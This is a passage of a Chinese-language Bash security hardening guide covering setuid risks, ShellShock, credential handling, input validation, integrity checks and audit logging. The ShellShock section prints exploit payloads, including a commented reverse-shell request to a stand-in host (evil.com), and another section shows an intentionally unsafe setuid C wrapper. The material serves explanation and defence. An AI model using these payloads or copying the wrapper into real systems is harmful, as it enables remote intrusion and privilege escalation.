    if [[ "$user_filename" == .* ]]; then
        echo "错误: 禁止以点开头的文件" >&2; return 1
    fi

    # 第2层：构造并提供规范化
    local full_path="$safe_base/$user_filename"
    local canonical
    canonical="$(realpath -m "$full_path" 2>/dev/null)" || {
        echo "错误: 无法解析路径" >&2; return 1
    }

    # 第3层：验证规范路径在允许范围内
    local base_canonical
    base_canonical="$(realpath -m "$safe_base" 2>/dev/null)"
    if [[ "$canonical" != "$base_canonical"/* ]] && \
       [[ "$canonical" != "$base_canonical" ]]; then
        echo "错误: 路径遍历被阻止" >&2; return 1
    fi

    # 第4层：检查符号链接攻击（文件已存在时）
    if [[ -e "$canonical" ]] && [[ -L "$canonical" ]]; then
        local link_target
        link_target="$(readlink -f "$canonical")"
        if [[ "$link_target" != "$base_canonical"/* ]]; then
            echo "错误: 符号链接指向白名单外" >&2; return 1
        fi
    fi

    return 0
}
```

# 6. setuid 脚本风险

setuid（Set User ID）机制允许可执行文件以文件所有者的权限运行，而非执行者的权限。Linux 系统**故意禁用**了 Shell 脚本的 setuid 位，这并非设计缺陷，而是基于深刻的安全考量。

## 6.1 Linux 为何禁用 setuid Shell 脚本

**内核级决策：** 在 Unix 早期，setuid 脚本是被支持的。但 Linux 内核的设计者意识到其存在不可修复的竞态条件（TOCTOU），从最早的内核版本就明确禁用了 Shell 脚本的 setuid。

```bash
#!/bin/bash
# ── 演示：setuid 在脚本上无效 ──
# 假设 root 执行：
# chown root:root my_script.sh
# chmod 4755 my_script.sh      # 设置 setuid 位

# 普通用户执行此脚本
./my_script.sh
echo "UID: $(id -u)"            # 输出仍然是普通用户的 UID
echo "EUID: $(id -u)"           # 有效 UID 也未提升

# 原因：Linux 内核的 execve() 系统调用在解析 shebang 时，
# 会忽略脚本文件的 setuid/setgid 位
# 只有 ELF 二进制程序可以保留 setuid 位
```

**根本原因 — 不可修复的竞态条件：**

```
时间线：
  T1: 用户执行 setuid 脚本 (UID=1000, 文件所有者为 root)
  T2: 内核打开脚本文件，准备读取 shebang 行
  T3: (竞态窗口) 攻击者将脚本替换为符号链接指向自己的脚本
  T4: 内核读取 shebang，启动解释器 (/bin/bash)
  T5: 解释器以 root 权限执行攻击者的脚本内容
```

这个竞态窗口在本地文件系统上可能只有几微秒，但在 NFS 等网络文件系统上可以拉到秒级，使得攻击切实可行。

```bash
# ── setuid C wrapper（传统"解决方案"及其风险） ──
# 唯一能实现类似效果的是编写 setuid 的 C 包装程序
# 但这带来了新的风险：如果包装程序编写不当，
# 环境变量、路径、参数处理中的任何一个漏洞都可能导致权限提升

# 危险示例（C wrapper）：
cat > dangerous_wrapper.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    // 危险！继承了 caller 的环境变量
    setuid(0);
    system("/path/to/script.sh");  // system() 调用 /bin/sh -c
    return 0;
}
EOF
# 攻击者可以设置 PATH 环境变量来劫持 sh
```

## 6.2 sudo 替代方案

`sudo` 是执行特权操作的安全机制，因为它是一个经过严格审计的 setuid **二进制程序**，在降低权限和执行命令之间做了大量安全检查。

```bash
#!/bin/bash
# ── sudo 安全配置 ──

# /etc/sudoers.d/myapp（通过 visudo 编辑）
# 原则：最小权限，精确到命令+参数
# %appgroup ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp
# %appgroup ALL=(root) NOPASSWD: /usr/bin/journalctl -u myapp --since *

# ── 脚本中使用 sudo ──
restart_service() {
    local service="$1"

    # 验证输入（防止在 sudo 参数中注入额外命令）
    if [[ ! "$service" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        echo "非法服务名" >&2; return 1
    fi

    # 使用精确的命令路径
    sudo /usr/bin/systemctl restart "$service"
}

# ── env_reset：sudo 默认行为的重要安全特性 ──
# sudo 默认启用 env_reset，清空大部分环境变量
# 检查 sudo 的 env_keep 设置是否引入风险：
# sudo -V | grep "Environment variables"

# ── 需要传递特定环境变量时的安全做法 ──
# 不推荐：sudo -E（保留所有环境变量，不安全）
# 推荐：通过参数或标准输入传递数据

echo "$sensitive_data" | sudo tee /etc/myapp/config.conf > /dev/null

# 或使用 sudo 的 --preserve-env 精确指定变量
# sudo --preserve-env=MY_APP_VAR command

# ── 替代方案：以特定用户身份运行守护进程 ──
# 让需要特权的操作由专用服务账户通过 systemd socket activation 执行
# 彻底消除脚本中权限提升的需求
```

# 7. ShellShock 回顾

ShellShock（CVE-2014-6271）是 2014 年 9 月披露的 Bash 远程代码执行漏洞，影响范围涵盖 Web 服务器、DHCP 客户端、Git 部署、CUPS 打印服务等任何通过环境变量与 Bash 交互的系统。

## 7.1 CVE-2014-6271 原理分析

**漏洞本质：** Bash 在解析环境变量中的函数定义时，没有在函数体结束后停止解析，导致紧随其后的额外命令也被执行。

```bash
#!/bin/bash
# ── ShellShock 漏洞原理演示 ──

# Bash 允许通过环境变量导出函数（Bash 特有机制）：
my_func() { echo "hello"; }
export -f my_func

# 子 Bash 进程的环境变量中会包含：
# BASH_FUNC_my_func%%=() {  echo "hello"; }

# 漏洞触发流程：
# 1. Bash 启动时扫描所有环境变量
# 2. 遇到以 () { 开头的值，认为这是一个函数定义
# 3. 将其作为函数体源码进行解析
# 4. 解析完 } 后，**没有停止**，继续执行后面的内容

# 原始 CVE-2014-6271 漏洞载荷：
env x='() { :;}; echo VULNERABLE' bash -c :
# 输出: VULNERABLE
#               ^^^^^^^^^^^^^^^ 这部分在函数定义之后被执行了！

# 解释：
# x='() { :;}; echo VULNERABLE'
#      ^^^^^^^^  函数体（合法的空操作）
#               ^^^ 函数定义结束
#                ^^^^^^^^^^^^^^^ 攻击载荷：被意外执行！

# ── 真实攻击场景 ──

# 场景 1: CGI Web 服务器
# Apache/Nginx 通过 CGI 将 HTTP 头转为环境变量
# 攻击者发送：
# curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1" \
#      http://victim.com/cgi-bin/test.cgi

# 场景 2: DHCP 客户端
# DHCP 服务器响应的选项字段通过 dhclient 传给 Bash
# 恶意 DHCP 服务器可以注入脚本载荷

# 场景 3: SSH ForceCommand
# OpenSSH 的 ForceCommand 在某些配置下会触发

# 场景 4: Git 子命令
# git clone 等操作在特定配置下触发

# ── 补丁绕过（CVE-2014-7169 等） ──
# 第一个补丁（CVE-2014-6271 的修复）存在绕过：
env X='() { (a)=>\' bash -c "echo vulnerable"
# 该凭据仍然可以在某些修补版本上执行

# 最终正确的修补（bash-4.3 patch 033+）：
# 1. 函数解析器不再执行函数体之后的代码
# 2. 限制导出函数名只能包含安全字符
# 3. 使用 BASH_FUNC_ 前缀和 %%= 后缀隔离函数
```

## 7.2 检测与防护

```bash
#!/bin/bash
# ── 检测当前系统是否受 ShellShock 影响 ──

check_shellshock() {
    local vulnerable=0

    echo "=== ShellShock 检测 ==="

    # CVE-2014-6271
    if env x='() { :;}; echo VULNERABLE' bash -c : 2>/dev/null | grep -q VULNERABLE; then
        echo "[危险] CVE-2014-6271: 存在！"
        ((vulnerable++))
    else
        echo "[安全] CVE-2014-6271: 已修复"
    fi

    # CVE-2014-7169
    local test_result
    test_result="$(cd /tmp; rm -f /tmp/echo; env X='() { (a)=>\' bash -c "echo 2>/dev/null"; cat /tmp/echo 2>/dev/null)"
    if [[ -n "$test_result" ]]; then
        echo "[危险] CVE-2014-7169: 可能存在！"
        ((vulnerable++))
    else
        echo "[安全] CVE-2014-7169: 已修复"
    fi

    # 检查 /bin/sh 是否链接到脆弱版本的 bash
    if ! bash --version | head -1 | grep -qE 'version 4\.[3-9]|[5-9]\.'; then
        echo "[警告] Bash 版本较旧，建议升级到 4.3+"
    fi

    return "$vulnerable"
}
check_shellshock

# ── 防护措施 ──

# 1. 软件层面
# - 升级 Bash 到最新版本（4.3+ 或供应商修补版）
# - yum update bash / apt update bash

# 2. 应用层面：CGI 脚本加固
#   在 CGI 脚本中显式清理环境
clean_cgi_env() {
    # 移除所有可疑的函数定义环境变量
    unset ${!BASH_FUNC_*}
    unset ${!BASH_ALIASES_*}

    # 只保留 CGI 标准变量
    local keep_pattern='^(HTTP_|CONTENT_|REQUEST_|QUERY_|SERVER_|REMOTE_|GATEWAY_)'
    for var in $(env | cut -d= -f1); do
        if [[ ! "$var" =~ $keep_pattern ]]; then
            unset "$var" 2>/dev/null || true
        fi
    done
}
# 在 CGI 脚本入口调用 clean_cgi_env

# 3. 网络层面
# - WAF 规则：检测 User-Agent/Cookie 中包含 () { 的请求
# - mod_security 规则：检测环境变量注入载荷

# 4. 架构层面
# - 在 Docker 容器中使用最小化的 Alpine 镜像（自带的 ash 不受影响）
# - 使用非 Bash 的 Shell 处理 CGI（sh、dash）
# - 通过中间件隔离：CGI 请求先经过 Python/Go 代理层
```

# 8. 密码与密钥管理

在 Shell 脚本中处理密码、API 密钥、证书等敏感凭证时，任何一个不当操作都可能导致凭据泄露。泄露途径包括：进程列表（ps）、Shell 历史文件、日志输出、审计系统、调试输出等。

## 8.1 命令行传密码的风险

**命令行参数在进程列表中是明文的！**

```bash
#!/bin/bash
# ── 命令行泄露演示 ──

# 这是最常见的错误做法：
mysql -u root -p"$MYSQL_ROOT_PASSWORD" -e "SHOW DATABASES"
#                                      ^^^^^^^^^^^^
# 这个密码会出现在 /proc/*/cmdline 和 ps aux 输出中
# 系统上的任何用户都可以看到！

# 证明：
#!/bin/bash
# 终端 1 执行
sleep 3000 "MySuperSecretPassword123" &
# 终端 2 执行
ps aux | grep "MySuperSecret"        # 密码直接显示
cat /proc/$(pgrep -f sleep)/cmdline | tr '\0' ' '
# 输出: sleep 3000 MySuperSecretPassword123

# ── 正确做法 ──

# 方案一：使用标准输入传递密码
mysql -u root -p <<SQL 2>/dev/null
SHOW DATABASES;
SQL
# 但这里 heredoc 中的密码仍可能泄露，见下节

# 方案二：使用配置文件
# MySQL: ~/.my.cnf 每段可包含 user/password
cat > ~/.my.cnf << 'CNF'
[client]
user=root
password=MySecretPassword
CNF
chmod 600 ~/.my.cnf
mysql --defaults-file=~/.my.cnf -e "SHOW DATABASES"

# 方案三：使用临时文件（配合 trap 自动销毁）
tmp_conf="$(mktemp)"
chmod 600 "$tmp_conf"
trap 'rm -f "$tmp_conf"' EXIT

cat > "$tmp_conf" <<EOF
[client]
user=$db_user
password=$db_pass
EOF
mysql --defaults-file="$tmp_conf" -e "SHOW DATABASES"
# 退出时 tmp_conf 被自动删除

# 方案四：使用环境变量（程序支持时）
# curl -u "$USER:$PASS" 同样在进程列表中暴露！
# 正确方式：
curl --netrc-file "$tmp_conf" https://api.example.com

# 方案五：使用交互式输入（非脚本友好）
# mysql -u root -p    # 提示输入密码，不在进程列表中
```

## 8.2 Heredoc 的安全风险

```bash
#!/bin/bash
# ── Heredoc 变量展开导致的泄露 ──

# 未引用的 heredoc 标识符：变量在 heredoc 内部被展开
password="s3cr3t!"

cat <<DISK_USAGE
Date: $(date)
Disk: $(df -h /)
Backup started with key: $password    # 密码被展开到输出！
DISK_USAGE

# 如果 cat 的输出被重定向到日志或显示到屏幕，密码就泄露了

# ── 安全做法：引用 heredoc 标识符阻止展开 ──
cat <<'DISK_USAGE'
Date: $(date)
Disk: $(df -h /)
Backup key is in environment, not displayed here.
DISK_USAGE
# 使用 'DISK_USAGE'（引号包围标识符）使得其中所有内容
# 都是字面量，不进行变量展开和命令替换

# ── 但 heredoc 写入文件时仍需注意权限 ──
# 危险：密码写入全局可读文件
cat > /tmp/cert.pem <<'EOF'
-----BEGIN PRIVATE KEY-----
... key content ...
-----END PRIVATE KEY-----
EOF
# ^^ 文件权限是默认的 0644，任何用户可读

# 安全：
(
    umask 0077
    cat > /tmp/cert.pem <<'EOF'
-----BEGIN PRIVATE KEY-----
... key content ...
-----END PRIVATE KEY-----
EOF
)
chmod 600 /tmp/cert.pem  # 双重保险
```

## 8.3 环境变量传密 — 最佳实践与风险

```bash
#!/bin/bash
# ── 环境变量传递密码的权衡 ──

# 优点：
# - 不会出现在 ps aux / procfs 中
# - 不需要磁盘上的临时文件
# - 子进程可通过 environ 继承（/proc/pid/environ 仅所有者可读）
#
# 缺点：
# - /proc/pid/environ 对本用户可见（但非特权用户看不到其他用户的 environ）
# - 可能被子进程不慎导出（如 perl/python 的 %ENV 默认对外暴露）
# - Bash 4.4 之前的函数导出机制可能泄露环境中的任意数据

# ── 最佳实践 ──

# 1. 从外部安全存储加载，不硬编码
if [[ -f /etc/myapp/secrets ]]; then
    source /etc/myapp/secrets           # 仅 root 可读
else
    echo "错误: 无法加载密钥文件" >&2
    exit 1
fi

# 2. 使用后立即清除
connect_api() {
    local api_key="${API_KEY:-}"
    curl -s -H "Authorization: Bearer $api_key" "$@"
    unset api_key  # 函数返回后清理本地副本
}
unset API_KEY  # 或使用 typeset 限制作用域

# 3. 绝不允许打印或记录
# 错误做法
echo "Using password: $PASSWORD"        # 泄露到日志
echo "$PASSWORD" | logger -t myapp      # 泄露到 syslog

# 正确做法
# 使用 trap DEBUG / set -x 时避免暴露
if [[ "${BASH_XTRACEFD:-}" ]]; then
    set +x  # 暂时关闭 xtrace
    handle_password
    set -x  # 重新开启
fi

# 4. 使用专用密钥管理工具
# 从 HashiCorp Vault 获取密钥
# export DB_PASS=$(vault read -format=json secret/db | jq -r '.data.password')

# 使用 pass (passwordstore.org)
# export DB_PASS=$(pass show databases/production)

# 5. 安全地构建命令行参数数组
build_mysql_args() {
    local -a args=()
    args+=(--defaults-extra-file=<(echo "[client]"; echo "password=$DB_PASS"))
    # 注意：进程替换 <(...) 在 ps 中显示为 /dev/fd/63，不暴露内容
    mysql "${args[@]}"
}
```

**密码存储位置的安全等级：**

| 位置 | 泄露风险 | 适用场景 |
|------|---------|---------|
| 进程命令行 (`/proc/*/cmdline`) | 任何用户可读 | **永不使用** |
| 环境变量 (`/proc/*/environ`) | 仅所有者可读 (Linux) | 短时效的运行时凭证 |
| 硬编码在脚本中 | 源代码/版本控制系统泄露 | **永不使用** |
| 文件系统临时文件 | 取决于文件权限 | 需要确保正确设置权限和清理 |
| 专用配置文件 (0600) | 仅所有者可读 | 长期使用的凭证 |
| 密钥管理服务 (KMS/Vault) | 审计可控 | 生产环境最佳实践 |
| 临时文件描述符 (heredoc) | 文件描述符仅本进程可见 | 中短期凭证传递 |

# 9. 输入验证框架

一个健壮的 Shell 脚本应将所有外部输入（命令行参数、环境变量、文件内容、管道输入、网络响应）视为不可信，并进行系统化的验证。

## 9.1 分层验证框架

```bash
#!/bin/bash
# ── 完整的输入验证框架 ──
# 设计原则：
#   1. 尽早验证（在入口立即检查）
#   2. 分层验证（格式 → 类型 → 范围 → 业务逻辑）
#   3. 统一错误处理（一致的用户反馈和日志）
#   4. 白名单优先于黑名单

readonly SCRIPT_NAME="$(basename "$0")"

# ── 日志函数 ──
log_security() {
    local level="$1"; shift
    printf '[%s] [%s] [%s] %s\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
        "$level" \
        "$SCRIPT_NAME" \
        "$*" >&2
}

# ── 验证结果收集 ──
declare -a VALIDATION_ERRORS=()

add_error() {
    VALIDATION_ERRORS+=("$1")
}

has_errors() {
    ((${#VALIDATION_ERRORS[@]} > 0))
}

show_errors() {
    if has_errors; then
        log_security "ERROR" "输入验证失败："
        for err in "${VALIDATION_ERRORS[@]}"; do
            log_security "ERROR" "  - $err"
        done
        return 1
    fi
    return 0
}

# ── 第一层：类型检查 ──
validate_type_integer() {
    local value="$1" label="${2:-value}"
    if [[ -z "$value" ]]; then
        add_error "$label: 不能为空"
        return 1
    fi
    # 严格整数匹配（不允许前导零，除非是 "0" 本身）
    if [[ ! "$value" =~ ^-?[0-9]+$ ]]; then
        add_error "$label='$value': 不是有效的整数"
        return 1
    fi
    # 防止整数溢出（Bash 64 位限制：-2^63 ~ 2^63-1）
    if (( value > 9223372036854775807 )) || (( value < -9223372036854775808 )); then
        add_error "$label='$value': 整数溢出"
        return 1
    fi
    return 0
}

validate_type_float() {
    local value="$1" label="${2:-value}"
    if [[ ! "$value" =~ ^-?[0-9]+(\.[0-9]+)?$ ]]; then
        add_error "$label='$value': 不是有效的浮点数"
        return 1
    fi
    return 0
}

validate_type_port() {
    local port="$1" label="${2:-port}"
    if ! validate_type_integer "$port" "$label"; then
        return 1
    fi
    if (( port < 1 || port > 65535 )); then
        add_error "$label='$port': 端口号必须在 1~65535 之间"
        return 1
    fi
    # 禁止特权端口（非 root 场景）
    if (( port < 1024 )) && [[ "$(id -u)" != "0" ]]; then
        add_error "$label='$port': 非 root 用户不能使用特权端口 (1-1023)"
        return 1
    fi
    return 0
}

validate_type_email() {
    local email="$1" label="${2:-email}"
    # RFC 5322 简化匹配
    local email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if [[ ! "$email" =~ $email_regex ]]; then
        add_error "$label='$email': 不是有效的邮箱地址"
        return 1
    fi
    return 0
}

# ── 第二层：格式与模式检查 ──
validate_regex() {
    local value="$1" pattern="$2" label="${3:-value}"
    if [[ ! "$value" =~ $pattern ]]; then
        add_error "$label='$value': 不匹配模式 '$pattern'"
        return 1
    fi
    return 0
}

validate_length() {
    local value="$1" min="$2" max="$3" label="${4:-value}"
    local len=${#value}
    if (( len < min || len > max )); then
        add_error "$label: 长度 $len 超出范围 [$min, $max]"
        return 1
    fi
    return 0
}

# ── 第三层：白名单/枚举验证 ──
validate_enum() {
    local value="$1" label="${2:-value}"; shift 2
    local valid_values=("$@")

    for v in "${valid_values[@]}"; do
        if [[ "$value" == "$v" ]]; then
            return 0
        fi
    done
    add_error "$label='$value': 不是有效选项 (允许: ${valid_values[*]})"
    return 1
}

# ── 第四层：业务逻辑验证 ──
validate_file_exists() {
    local path="$1" label="${2:-file}"
    if [[ ! -f "$path" ]]; then
        add_error "$label='$path': 文件不存在"
        return 1
    fi
    if [[ ! -r "$path" ]]; then
        add_error "$label='$path': 文件不可读"
        return 1
    fi
    return 0
}

validate_no_path_traversal() {
    local path="$1" label="${2:-path}"
    if [[ "$path" =~ \.\. ]]; then
        add_error "$label: 不允许路径遍历 (..) "
        return 1
    fi
    if [[ "$path" =~ ^/ ]]; then
        add_error "$label: 不允许绝对路径"
        return 1
    fi
    if [[ "$path" =~ ^~ ]]; then
        add_error "$label: 不允许 ~ 展开"
        return 1
    fi
    return 0
}
```

## 9.2 实际使用示例

```bash
#!/bin/bash
# ── 综合输入验证示例：Web 服务器部署脚本 ──

parse_and_validate_args() {
    while (($# > 0)); do
        case "$1" in
            --host)
                validate_regex "$2" '^[a-zA-Z0-9.-]+$' "hostname" || return 1
                validate_length "$2" 1 253 "hostname" || return 1
                HOST="$2"; shift 2
                ;;
            --port)
                validate_type_port "$2" "port" || return 1
                PORT="$2"; shift 2
                ;;
            --env)
                validate_enum "$2" "environment" \
                    "development" "staging" "production" || return 1
                ENV="$2"; shift 2
                ;;
            --count)
                validate_type_integer "$2" "instance-count" || return 1
                # 业务范围检查
                if (( $2 < 1 || $2 > 100 )); then
                    add_error "instance-count: 必须在 1~100 之间"
                    return 1
                fi
                COUNT="$2"; shift 2
                ;;
            --config)
                validate_no_path_traversal "$2" "config-path" || return 1
                local full_config="/etc/myapp/$2"
                validate_file_exists "$full_config" "config-file" || return 1
                CONFIG="$full_config"; shift 2
                ;;
            *)  add_error "未知选项: $1"; return 1 ;;
        esac
    done

    # 检查必填参数
    [[ -z "${HOST:-}" ]] && add_error "缺少必填参数: --host"
    [[ -z "${PORT:-}" ]] && add_error "缺少必填参数: --port"
    [[ -z "${ENV:-}" ]] && add_error "缺少必填参数: --env"

    if has_errors; then
        show_errors
        return 1
    fi
    return 0
}

# 使用
if ! parse_and_validate_args "$@"; then
    echo "用法: $SCRIPT_NAME --host <host> --port <port> --env <env> [--count <n>]"
    exit 1
fi
echo "验证通过：部署 $COUNT 个实例到 $HOST:$PORT ($ENV 环境)"
```

# 10. 脚本完整性检查

确保执行的脚本未被篡改，是防御供应链攻击和本地篡改的关键环节。完整性的验证分为部署前的校验和运行时的自检两个层面。

## 10.1 校验和验证

```bash
#!/bin/bash
# ── 脚本自完整性检查（运行时自检） ──

# 计算自身的 SHA256 哈希
self_checksum() {
    # 跳过自身校验部分（最后 12 行），只验证业务逻辑
    local script_content
    script_content="$(head -n -12 "$0")"
    printf '%s\n' "$script_content" | sha256sum | awk '{print $1}'
}

# 嵌入预期校验和（部署时计算后写入）
EXPECTED_CHECKSUM="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d600000000000000000000000000000000"

# 注意：这种内嵌校验和的方式可以被有能力的攻击者绕过
# 仅作为简单的篡改检测，不替代代码签名
verify_integrity() {
    local actual
    actual="$(self_checksum)"
    if [[ "$actual" != "$EXPECTED_CHECKSUM" ]]; then
        echo "[严重] 脚本完整性检查失败！" >&2
        echo "  预期: $EXPECTED_CHECKSUM" >&2
        echo "  实际: $actual" >&2
        echo "  脚本可能已被篡改，拒绝执行！" >&2
        exit 1
    fi
}

# ── 外部文件校验 ──
verify_file_checksum() {
    local file="$1" expected_hash="$2" algorithm="${3:-sha256}"

    if [[ ! -f "$file" ]]; then
        echo "[错误] 校验失败：文件不存在 $file" >&2; return 1
    fi

    local actual_hash
    case "$algorithm" in
        sha256)  actual_hash="$(sha256sum "$file" | awk '{print $1}')" ;;
        sha512)  actual_hash="$(sha512sum "$file" | awk '{print $1}')" ;;
        md5)     actual_hash="$(md5sum "$file" | awk '{print $1}')" ;;
        *)       echo "[错误] 不支持的校验算法: $algorithm" >&2; return 1 ;;
    esac

    if [[ "$actual_hash" != "$expected_hash" ]]; then
        echo "[错误] 文件校验失败: $file" >&2
        echo "  算法:   $algorithm" >&2
        echo "  预期:   $expected_hash" >&2
        echo "  实际:   $actual_hash" >&2
        return 1
    fi
    return 0
}

# ── 比较不同来源的校验和 ──
# 假设从可信来源获取了校验和文件
# SHA256 (/path/to/downloaded.tar.gz) = abc123...
verify_download() {
    local download_file="$1" checksum_file="$2"

    # 1. 验证校验和文件自身
    # 2. 逐行比对
    while read -r hash filepath; do
        if [[ ! -f "$filepath" ]]; then
            echo "[警告] 校验和文件中引用的文件不存在: $filepath" >&2
            continue
        fi
        local actual
        actual="$(sha256sum "$filepath" | awk '{print $1}')"
        if [[ "$hash" != "$actual" ]]; then
            echo "[错误] 文件篡改: $filepath (hash mismatch)" >&2
            return 1
        fi
    done < "$checksum_file"
    return 0
}
```

## 10.2 GPG 签名机制

```bash
#!/bin/bash
# ── GPG 签名验证脚本完整性 ──

# 签名生成（由脚本发布者执行，不在运行时脚本中）
generate_signature() {
    local script_file="$1"
    # 分离式签名
    gpg --detach-sign --armor "$script_file"
    # 生成 script.sh.asc 签名文件

    # 内联签名（签名嵌入脚本末尾）
    # gpg --clearsign "$script_file"
}

# 运行时签名验证
verify_gpg_signature() {
    local script_file="$1" sig_file="$2" trusted_key="$3"

    # 1. 检查 GPG 是否可用
    if ! command -v gpg >/dev/null 2>&1; then
        echo "[错误] GPG 未安装，无法验证签名" >&2
        return 1
    fi

    # 2. 检查密钥是否已导入
    if ! gpg --list-keys "$trusted_key" >/dev/null 2>&1; then
        echo "[错误] 可信 GPG 密钥未导入: $trusted_key" >&2
        return 1
    fi

    # 3. 验证签名
    local result
    if ! result="$(gpg --verify "$sig_file" "$script_file" 2>&1)"; then
        echo "[安全警告] GPG 签名验证失败！脚本可能被篡改！" >&2
        echo "$result" >&2
        return 1
    fi
    echo "GPG 签名验证通过: $(echo "$result" | grep 'Good signature')"
    return 0
}

# ── 公钥管理 ──
import_signing_key() {
    local keyserver="${KEYSERVER:-hkps://keys.openpgp.org}"
    local key_id="$1"

    echo "从 $keyserver 导入密钥 $key_id ..."
    gpg --keyserver "$keyserver" --recv-keys "$key_id" || {
        echo "[错误] 无法从密钥服务器获取公钥" >&2
        echo "  手动导入: gpg --import public-key.asc" >&2
        return 1
    }

    # 验证密钥指纹
    echo "密钥指纹:"
    gpg --fingerprint "$key_id"
    echo "请手动确认以上指纹与发布者公布的指纹一致！"
}

# ── 自验证包装器 ──
# 脚本结构：
#!/bin/bash
# 第 1 部分: 内嵌公钥 或 信任指纹
TRUSTED_FINGERPRINT="AAAA BBBB CCCC DDDD EEEE FFFF 0000 1111 2222 3333"

# 第 2 部分: 验证逻辑
# ... GPG 验证函数 ...

# 第 3 部分: 业务逻辑（签名的有效载荷）
# ... 实际的脚本内容 ...
```

**部署流水线中的完整性保障：**

```bash
#!/bin/bash
# ── 部署时生成校验清单 ──

generate_deployment_manifest() {
    local deploy_dir="$1" manifest_file="${2:-manifest.sha256}"

    echo "# 部署清单 - $(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$manifest_file"
    echo "# 生成者: $(whoami)@$(hostname)" >> "$manifest_file"

    find "$deploy_dir" -type f ! -name 'manifest.*' -print0 | \
        sort -z | \
        while IFS= read -r -d '' file; do
            sha256sum "$file" >> "$manifest_file"
        done

    # 对清单本身签名（防止清单被篡改）
    gpg --detach-sign --armor "$manifest_file" || true

    echo "清单已生成: $manifest_file"
}

# ── 目标机器上的验证 ──
verify_deployment() {
    local manifest_file="$1" deploy_dir="$2"

    if [[ ! -f "$manifest_file" ]]; then
        echo "[错误] 部署清单不存在" >&2
        return 1
    fi

    # 验证清单签名（如果有 .asc 文件）
    if [[ -f "$manifest_file.asc" ]]; then
        gpg --verify "$manifest_file.asc" "$manifest_file" || {
            echo "[错误] 部署清单签名验证失败" >&2
            return 1
        }
    fi

    # 逐个验证文件
    local mismatch=0
    while IFS=' ' read -r hash filepath; do
        if [[ "$filepath" == \#* ]] || [[ -z "$filepath" ]]; then
            continue
        fi
        local full_path="$deploy_dir/$filepath"
        if [[ ! -f "$full_path" ]]; then
            echo "[缺失] $filepath" >&2
            ((mismatch++))
            continue
        fi
        local actual_hash
        actual_hash="$(sha256sum "$full_path" | awk '{print $1}')"
        if [[ "$hash" != "$actual_hash" ]]; then
            echo "[篡改] $filepath" >&2
            echo "  预期: $hash" >&2
            echo "  实际: $actual_hash" >&2
            ((mismatch++))
        fi
    done < "$manifest_file"

    if ((mismatch > 0)); then
        echo "[安全警告] 发现 $mismatch 个文件被篡改或缺失！" >&2
        return 1
    fi

    echo "部署完整性验证通过：$(wc -l < "$manifest_file") 个文件全部匹配"
    return 0
}
```

# 11. 审计日志

安全审计日志不仅仅是记录"发生了什么"，还需要保证记录的**不可否认性**（non-repudiation）和**不可篡改性**（tamper-resistance）。在 Shell 环境中，这需要特别的工程设计。

## 11.1 分层审计日志框架

```bash
#!/bin/bash
# ── 审计日志框架 ──

# 日志文件路径（使用仅追加模式防篡改）
readonly AUDIT_LOG="${AUDIT_LOG:-/var/log/myapp/audit.log}"
readonly AUDIT_LOG_DIR="$(dirname "$AUDIT_LOG")"

# 初始化审计环境
audit_init() {
    # 确保日志目录存在且安全
    if [[ ! -d "$AUDIT_LOG_DIR" ]]; then
        mkdir -p "$AUDIT_LOG_DIR" || {
            echo "[严重] 无法创建审计日志目录" >&2
            exit 1
        }
    fi
    chmod 750 "$AUDIT_LOG_DIR"
    # 注意：chown 需要 root 权限
    # chown root:adm "$AUDIT_LOG_DIR"

    # 创建日志文件（如果不存在）
    if [[ ! -f "$AUDIT_LOG" ]]; then
        touch "$AUDIT_LOG" 2>/dev/null || {
            echo "[严重] 无法创建审计日志文件" >&2
            exit 1
        }
        chmod 640 "$AUDIT_LOG"
    fi
}

# 核心审计函数（追加写入，不可覆盖）
audit_logger() {
    local level="$1" action="$2"; shift 2
    local details="$*"

    # 构建结构化日志行
    local log_entry
    printf -v log_entry '%s|%s|%s|%d|%s|%s|%s' \
        "$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)" \
        "$level" \
        "$(whoami)" \
        "$$" \
        "${SSH_CONNECTION:-local}" \
        "$action" \
        "${details//\|/\\|}"      # 转义 | 防止字段混淆

    # 使用 printf 追加（而非 > 重定向覆盖）
    printf '%s\n' "$log_entry" >> "$AUDIT_LOG" 2>/dev/null || {
        echo "[严重] 无法写入审计日志！系统可能已被入侵。" >&2
        # 紧急日志写入备用位置
        printf '%s\n' "$log_entry" >> "/tmp/audit_fallback.log" 2>/dev/null
    }
}

# ── 不同级别的审计记录 ──
audit_auth()     { audit_logger "AUTH"    "$@"; }   # 认证/授权操作
audit_change()   { audit_logger "CHANGE"  "$@"; }   # 配置/数据变更
audit_access()   { audit_logger "ACCESS"  "$@"; }   # 敏感数据访问
audit_admin()    { audit_logger "ADMIN"   "$@"; }   # 管理员操作
audit_security() { audit_logger "SECURITY" "$@"; }  # 安全事件
audit_error()    { audit_logger "ERROR"   "$@"; }   # 错误/异常

# ── 使用示例 ──
audit_init
audit_change "config_update" "key=database.max_connections old=100 new=200"
audit_auth "login_failed" "user=admin ip=192.168.1.100 reason=invalid_password"
audit_admin "service_restart" "service=nginx trigger=deploy_pipeline"
```

## 11.2 不可篡改日志的实现策略

```bash
#!/bin/bash
# ── 日志防篡改技术 ──

# 策略 1: 链式哈希（Hash Chain）
# 每条日志包含前一条的哈希，形成不可逆的链
readonly CHAIN_LOG="/var/log/myapp/chain.log"
CHAIN_PREV_HASH="0000000000000000000000000000000000000000000000000000000000000000"

audit_chain_log() {
    local entry="$*"
    local timestamp
    timestamp="$(date -u +%s%N)"

    # 计算本条记录的哈希（包含前一条的哈希）
    local current_hash
    current_hash="$(printf '%s|%s|%s' "$timestamp" "$CHAIN_PREV_HASH" "$entry" | \
        sha256sum | awk '{print $1}')"

    printf '%s|%s|%s|%s\n' \
        "$timestamp" "$CHAIN_PREV_HASH" "$entry" "$current_hash" \
        >> "$CHAIN_LOG"

    # 更新链式哈希
    CHAIN_PREV_HASH="$current_hash"
}

# 验证链式日志的完整性
verify_chain_log() {
    local prev_hash=""
    local line_num=0

    while IFS='|' read -r timestamp hash entry current_hash; do
